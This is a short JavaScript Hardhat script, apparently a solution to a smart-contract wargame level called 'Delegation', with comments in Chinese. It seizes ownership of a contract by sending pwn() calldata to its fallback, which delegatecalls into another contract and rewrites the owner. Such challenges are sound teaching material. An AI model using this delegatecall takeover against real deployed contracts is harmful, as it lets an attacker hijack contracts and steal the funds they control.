const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // 請將此地址替換成部署的 Delegation 合約地址
    const delegationAddress = "0xYourDelegationContractAddress"; 

    // 用自己的介面來查詢 owner 狀態
    const delegationAbi = [
        "function owner() external view returns (address)"
    ];
    const delegation = new ethers.Contract(delegationAddress, delegationAbi, attacker);
    
    // 準備呼叫 pwn() 函數的 calldata（注意：pwn() 定義在 Delegate 合約，但 fallback delegatecall 會執行它）
    const iface = new ethers.utils.Interface([
        "function pwn()"
    ]);
    const data = iface.encodeFunctionData("pwn", []);

    console.log("發送交易呼叫 fallback, 使用 pwn() 的 calldata...");
    const tx = await attacker.sendTransaction({
        to: delegationAddress,
        data: data,
        gasLimit: 100000
    });
    await tx.wait();

    const newOwner = await delegation.owner();
    console.log("新的所有者:", newOwner);
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});